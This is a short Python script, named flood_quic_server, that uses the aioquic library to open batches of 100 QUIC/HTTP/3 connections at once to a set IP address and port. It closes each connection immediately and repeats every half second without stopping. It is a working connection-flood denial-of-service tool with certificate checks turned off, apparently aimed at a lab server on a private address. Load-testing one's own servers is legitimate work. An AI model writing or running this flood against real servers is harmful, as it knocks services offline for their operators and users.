import asyncio
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration

# Replace this with your aioquic server's actual IP address
# SERVER_ADDR = '192.168.115.131'
SERVER_ADDR = '192.168.58.128'
SERVER_PORT = 4433

CONNECTIONS_PER_BATCH = 100
DELAY_BETWEEN_BATCHES = 0.5 # seconds

async def flood_quic_server():
    configuration = QuicConfiguration(
        is_client=True,
        verify_mode=False,
        alpn_protocols=['h3']  # Explicitly specify HTTP/3 ALPN
    )

    while True:
        tasks = []
        for _ in range(CONNECTIONS_PER_BATCH):
            task = asyncio.create_task(connect_and_close(configuration))
            tasks.append(task)
            print("Connected")

        await asyncio.gather(*tasks)
        await asyncio.sleep(DELAY_BETWEEN_BATCHES)

async def connect_and_close(config):
    try:
        async with connect(SERVER_ADDR, SERVER_PORT, configuration=config) as client:
            pass  # Connect and immediately close
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    asyncio.run(flood_quic_server())
